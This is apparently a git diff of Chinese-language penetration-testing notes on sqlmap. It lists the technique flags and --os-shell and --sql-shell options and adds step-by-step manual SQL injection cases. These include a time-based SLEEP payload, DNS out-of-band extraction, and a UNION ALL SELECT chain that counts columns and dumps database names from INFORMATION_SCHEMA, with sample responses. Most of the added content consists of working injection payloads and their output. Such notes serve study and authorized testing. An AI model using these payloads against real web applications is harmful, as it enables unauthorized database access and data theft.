@@ -5,9 +5,12 @@
 |[sqlmap](https://github.com/sqlmapproject/sqlmap)| Automatic SQL injection and database takeover tool|
 
 
-sqlmap相关代码实现参考的白皮书(2009年)
 
-https://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf
+* 资料
+  * [Usage · sqlmapproject/sqlmap Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
+  * sqlmap相关代码实现参考的白皮书(2009年) [Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf](https://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf)
+
+
 
 ### tamper详解
 
@@ -86,12 +89,26 @@ sqlmap -u xxx.com/index.php/Index/view/id/40*.html --dbs
 
 -r 也是在请求包文件中的参数值后面加*号
 
+#### 参数 - 指定注入技术类型
+
+```
+--tech U
+--technique T
+```
+
+```
+B: Boolean-based blind
+E: Error-based
+U: Union query-based
+S: Stacked queries
+T: Time-based blind
+Q: Inline queries
+```
 
 #### 参数 - sql命令行
 
 ```
 --sql-shell
-
 ```
 
 #### 参数 - OS命令执行
@@ -122,11 +139,14 @@ sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "MySQL" --os-shell
 
 ### 案例1
 
-windows服务器的web应用存在SQLi 基于时间的盲注 如何快速获取数据?
+* 场景 - windows服务器的web应用 参数id 存在SQLi 类型为`基于时间的盲注` 如何快速获取数据? 
+  * 操作系统:windows
+  * 数据库类型:MySQL
+  * SQLi类型:**基于时间的盲注**
 
 原理参考[类型6 - "带外"(out-of-band)](web_vul_sqli.md#类型6---带外out-of-band)
 
-【实际测试】带外获取数据-自动化
+【实际测试】获取数据-自动化
 ```
 # 对比这2个方法
 # 基于时间的盲注 - 拿数据方法1: 根据延时来跑数据(很慢)
@@ -142,9 +162,21 @@ python sqlmap.py -u "http://vul.com/user.php?id=1" -p id --dbms mysql --dbs --dn
 ```
 
 【实际测试】带外获取数据-手动
-
 ```
-# 场景:windows服务器的web应用 参数id 存在SQLi 基于时间的盲注
+
+# 手工利用第0步 确认SQLi是否存在
+
+# id参数的值为
+1234' AND (SELECT 9905 FROM (SELECT(SLEEP(5)))vMZe) AND 'fACM'='fACM
+
+# 实际HTTP请求的第1行 内容如下 其中id参数的值做了编码 JavaScript encodeURIComponent()
+/user.php?id=1234'%20AND%20(SELECT%209905%20FROM%20(SELECT(SLEEP(5)))vMZe)%20AND%20'fACM'%3D'fACM HTTP/1.1
+
+# 延时了5秒多 所以确认存在SQLi.
+# Type: time-based blind
+# Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+
+-----
 
 # 手工利用第1步 测试能否收到数据
 # id参数的值为
@@ -155,6 +187,7 @@ python sqlmap.py -u "http://vul.com/user.php?id=1" -p id --dbms mysql --dbs --dn
 
 # 测试成功 收到了DNS数据.
 
+-----
 
 # 手工利用第2步 获取数据库的数据 如version()
 # id参数的值为
@@ -176,6 +209,77 @@ Hex to UTF-8
 5.5.53
 
 得知了MySQL的版本为5.5.53
+```
+
+### 案例2
+
+* 场景 - windows服务器的web应用 参数id 存在SQLi 类型为`UNION query`
+  * 操作系统:无关
+  * 数据库类型:MySQL
+  * SQLi类型:`UNION query`
+
+
+【实际测试】获取数据-自动化
+```
+# 指定技术为U
+python sqlmap.py -r /Users/xxx/Downloads/req.txt --proxy=socks5://127.0.0.1:1081 -p uid --dbms=mysql -p id -v  5 --tech=U --dbs
+```
+
+【实际测试】获取数据-手动
+```
+# 手工利用第0步 确认SQLi是否存在
+
+# id参数的值为
+1234' ORDER BY 10-- mucA
+
+# 使用二分法 根据Response长度、内容的不同 逐步确定了UNION共可查16个字段
+
+-----
+
+# 手工利用第1步 依次测试每个字段 看哪个字段会回显到Response
+
+# id参数的值为
+1234' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626b7171,(CASE WHEN (17=17) THEN 1 ELSE 0 END),0x716b717671),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ziys
+
+# 观察Response body
+# 发现Response body中有字符串 qbkqq1qbkqq
+
+# 格式为 [前缀][数据][后缀]
+# [前缀]和[后缀]的作用是方便匹配到获取到的[数据]
+# 这里前缀和后缀都是qbkqq  [数据]即
+1
+# 所以 第9个字段可以回显到Response
+
+-----
+
+# 手工利用第2步 再次确认 在使用MySQL的CONCAT函数的情况下 该字段是否仍会回显到Response
+
+# id参数的值为
+1234' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162716a71,0x6151484a717561715a4f44725a75456a45,0x7162766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- CkJc
+
+# Type: UNION query
+# Title: Generic UNION query (NULL) - 16 columns
+# 确认 在使用MySQL的CONCAT函数的情况下 该字段仍会回显到Response
+
+-----
+
+# 手工利用第3步 获取数据 如获取所有数据库的名称
+
+# id参数的值为
+1234' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162716a71,IFNULL(CAST(schema_name AS NCHAR),0x20),0x7162766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA-- MzIj
+
+# 观察Response body
+# 发现Response body中有字符串
+<td>qbqjqinformation_schemaqbvjq</td>
+<td>qbqjqmysqlqbvjq</td>
+<td>qbqjqperformance_schemaqbvjq</td>
+
+# 格式为 [前缀][数据][后缀]
+# [前缀]和[后缀]的作用是方便匹配到获取到的[数据]
+# 这里前缀和后缀都是qbqjq  [数据]即
+information_schema
+mysql
+performance_schema
 ```
 
 ### Usage
